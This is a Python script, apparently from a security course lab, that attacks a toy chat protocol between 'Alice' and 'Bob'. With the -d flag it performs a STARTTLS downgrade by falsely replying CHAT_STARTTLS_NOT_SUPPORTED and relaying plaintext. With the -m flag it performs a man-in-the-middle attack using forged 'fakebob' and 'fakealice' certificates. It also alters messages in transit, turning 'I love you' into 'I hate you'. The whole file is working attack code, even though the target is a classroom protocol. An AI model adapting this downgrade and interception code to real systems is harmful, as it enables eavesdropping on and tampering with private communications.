from distutils.command.clean import clean
import socket
from enum import Enum
from OpenSSL import crypto
import ssl
import threading
import sys
import os
import signal
from sys import argv, stdout

thread_exit = threading.Event()

class MessageType(Enum):
    CHAT_HELLO = 1
    CHAT_REPLY = 2
    CHAT_STARTTLS = 3
    CHAT_STARTTLS_ACK = 4
    CERTIFICATE_VERIFIED = 5
    CERTIFICATE_VERIFICATION_FAILED = 6
    CHAT_CLOSE = 7
    CHAT_STARTTLS_NOT_SUPPORTED=8

def mitm_attack(alice_host,bob_host): 
    
    alice_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    alice_conn.bind(('', 6000))

    bob_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        bob_ip = socket.gethostbyname(bob_host)
    except socket.gaierror:
        print("Error getting IP from hostname")
        exit()

    bob_conn.connect((bob_ip, 6000))

    handle_handshake(alice_conn, bob_conn)

def downgrade(alice_host,bob_host): 
    #
    fake_alice = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    fake_alice.bind(('', 6000))
    fake_alice.listen(5)
    unsecure_alice, _ = fake_alice.accept()
      
    fake_bob = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        bob_ip = socket.gethostbyname(bob_host)
    except socket.gaierror:
        print("Error getting IP from hostname")
        exit()

    fake_bob.connect((bob_ip,6000))
    print('conn with bob estbl')
    
    flag = 0        # 0 : alice to bob, 1 : bob to alice
    
    while True:
      if flag == 0:
        incoming_msg = unsecure_alice.recv(4096).decode('UTF-8')

        if incoming_msg == MessageType.CHAT_STARTTLS.name:
          response_msg = MessageType.CHAT_STARTTLS_NOT_SUPPORTED.name
          unsecure_alice.send(response_msg.encode('UTF-8'))
          break
        
        fake_bob.send(incoming_msg.encode())
        flag = 1
      else: 
        incoming_msg = fake_bob.recv(4096).decode('UTF-8')
        unsecure_alice.send(incoming_msg.encode('UTF-8'))
        flag = 0
    
    start_chat(unsecure_alice, fake_bob)

 
        
def start_chat(client_conn,server_conn):
  
  try: 
    #declare two thread objects and call the constructor
    send_to_alice = threading.Thread(target=alice_to_bob, args = (client_conn,server_conn), daemon=True)
    recv_from_bob = threading.Thread(target=bob_to_alice, args = (client_conn,server_conn), daemon=True) 
    
    #start thread which in turn invokes send_chat_messages and recv_chat_messages functions respectively
    send_to_alice.start()
    recv_from_bob.start()
    
    #send and recieve thread will run until terminated by timeout or CHAT_CLOSE message.
    send_to_alice.join()
    recv_from_bob.join()
  except Exception:
    print('chat ended')     
    
def alice_to_bob(client_conn, server_conn):
  while True:
    #wait for message from client for 1 second else return
    if thread_exit.wait(timeout=0.5):
        print('receiver thread exited...')
        return
    
    try:
      s_msg = client_conn.recv(4096).decode()
      print("msg from alice to bob"+s_msg)
      
      if s_msg == "I love you":
        s_msg = "I hate you"
        
      server_conn.send(s_msg.encode('UTF-8'))
      if s_msg == MessageType.CHAT_CLOSE.name : 
        print("Alice terminated the chat \n")
        thread_exit.set()
        client_conn.close()
        server_conn.close()
        return
    except Exception:
      print('chat ended')

def bob_to_alice(client_conn,server_conn):
  while True:
    #wait for message from client for 1 second else return
    if thread_exit.wait(timeout=0.5):
        print('receiver thread exited...')
        return
    
    try:
      s_msg = server_conn.recv(4096).decode()
      print("msg from bob to alice"+s_msg)
      client_conn.send(s_msg.encode('UTF-8'))
      if s_msg == MessageType.CHAT_CLOSE.name : 
        print("Bob terminated the chat \n")
        thread_exit.set()
        client_conn.close()
        server_conn.close()
        return
    except Exception:
      print('chat ended')

def handle_handshake(alice_conn, bob_conn):
    
    # handling handshake with alice
    alice_conn.listen(5)
    unsecure_alice, _ = alice_conn.accept()
    trust_store = create_trust_store('./ca_cert.pem')

    incoming_msg = unsecure_alice.recv(4096).decode('UTF-8')

    if incoming_msg == MessageType.CHAT_HELLO.name:
        response_msg = MessageType.CHAT_REPLY.name
        unsecure_alice.sendall(response_msg.encode())
        print("chat reply sent")
        incoming_msg = unsecure_alice.recv(4096).decode()
        print(incoming_msg)
        
        
        if incoming_msg == MessageType.CHAT_STARTTLS.name:
            print('chat_starttls rcvd')
            response_msg = MessageType.CHAT_STARTTLS_ACK.name
            unsecure_alice.send(response_msg.encode('UTF-8'))
            print('chat_starttls_ack sent')
            
            #Create a new SSL context that supports TLS.
            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
            
            #load the CA certificate used to verify other peers' certificates.
            ssl_context.load_verify_locations('./ca_cert.pem')
            
            #Load a private key and the corresponding certificate.
            ssl_context.load_cert_chain(certfile='./fakebob.pem', keyfile="./fakebob-rsa.pem")
            
            #peers' certificate should be verified
            ssl_context.verify_mode = ssl.CERT_REQUIRED
            
            #wraps the unsecure_socket and returns an SSL socket is tied to the ssl_context, its settings and certificates.
            secure_alice = ssl_context.wrap_socket(unsecure_alice, server_side=True)
            print('secure conn estblsh')
            print(secure_alice.recv(1024).decode('UTF-8'))
            secure_alice.send('secure hello reply'.encode('UTF-8'))
            rcvd_msg = secure_alice.recv(1024).decode('UTF-8')
            if rcvd_msg == MessageType.CERTIFICATE_VERIFIED.name: 
                print(rcvd_msg)
                #returns the DER-encoded form of the entire certificate as a sequence of bytes
                server_cert = secure_alice.getpeercert(binary_form=True)
                #returns true if peers' certificate is genuine.
                if certificate_verify(server_cert, trust_store) :
                    secure_alice.send(MessageType.CERTIFICATE_VERIFIED.name.encode('UTF-8'))
                    #start_chat(secure_alice)
                    #secure_alice.send("hi from trudy".encode('UTF-8'))
                else: 
                    secure_alice.send(MessageType.CERTIFICATE_VERIFICATION_FAILED.name.encode('UTF-8'))
                    secure_alice.close()
            else:
                print(rcvd_msg)
                print('server certificate verification failed...terminate connection')
                alice_conn.close()
        
        else:
            pass

    else: 
        print('connection failed')
        alice_conn.close()
    
    client_ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    client_ssl_context.load_cert_chain(certfile="./fakealice.pem",keyfile="./fakealice-rsa.pem")
    client_ssl_context.load_verify_locations('./ca_cert.pem')
    client_ssl_context.verify_mode = ssl.CERT_REQUIRED
    trust_store = create_trust_store('./ca_cert.pem')

    print('connection established with server')
    sent_msg =  MessageType.CHAT_HELLO.name
    bob_conn.send(sent_msg.encode())
    print('chat_hello sent')
    rcvd_msg = bob_conn.recv(4096).decode()
    
    if rcvd_msg == MessageType.CHAT_REPLY.name : 
        print('chat_reply rcvd')
        sent_msg = MessageType.CHAT_STARTTLS.name
        bob_conn.send(sent_msg.encode('UTF-8'))
        rcvd_msg = bob_conn.recv(4096).decode()
        print('chat_starttls sent')
        if rcvd_msg == MessageType.CHAT_STARTTLS_ACK.name:
            print('chat_starttls_ack rcvd')
            with client_ssl_context.wrap_socket(bob_conn) as secure_bob:
                 print('secure conn established')
                 secure_bob.send('secure hello'.encode('UTF-8'))
                 print(secure_bob.recv(1024).decode('UTF-8'))
                 
                 server_cert = secure_bob.getpeercert(binary_form = True)
                 #print(server_cert)
                 #print(server_cert)
                 if certificate_verify(server_cert, trust_store): 
                    secure_bob.send(MessageType.CERTIFICATE_VERIFIED.name.encode('UTF-8'))
                    rcvd_msg = secure_bob.recv(1024).decode('UTF-8')
                    if rcvd_msg == MessageType.CERTIFICATE_VERIFIED.name:
                      print(rcvd_msg)
                      try:
                        start_chat(secure_alice,secure_bob)
                      except:
                        print('')
                    else: 
                      print(rcvd_msg)
                      print('client certificate verification failed....terminating connection')
                      secure_bob.close()
                 
                 else: 
                    secure_bob.send(MessageType.CERTIFICATE_VERIFICATION_FAILED.name.encode('UTF-8'))
                    print('server certificate verification failed....terminating connection')
        
        #If TLS is not supported            
        elif rcvd_msg == MessageType.CHAT_STARTTLS_NOT_SUPPORTED.name:
            print('connection unsecure')
            #start_chat(bob_conn)
            return bob_conn              
                  
    else: 
        print('connection failed')
        bob_conn.close()

    alice_conn.close()
    bob_conn.close()

def certificate_verify(cert, trust_store):
  try:
    certificate_ctx = crypto.X509StoreContext(trust_store, crypto.load_certificate(crypto.FILETYPE_ASN1, cert))
    certificate_ctx.verify_certificate()
    return True
  except Exception as e:
    print(e)
    return False

def create_trust_store(root_cert):
  trust_store = crypto.X509Store()
  with open(root_cert,'r') as cert_file: 
        cert_file_content = cert_file.read()
  trust_store.add_cert(crypto.load_certificate(crypto.FILETYPE_PEM, cert_file_content))
  return trust_store

         
def main(): 
    if (len(argv) == 4 and argv[1] == "-d"):
        downgrade(argv[2],argv[3])
    elif(len(argv) == 4 and argv[1] == "-m"):
         mitm_attack(argv[2],argv[3])

    
   
main()
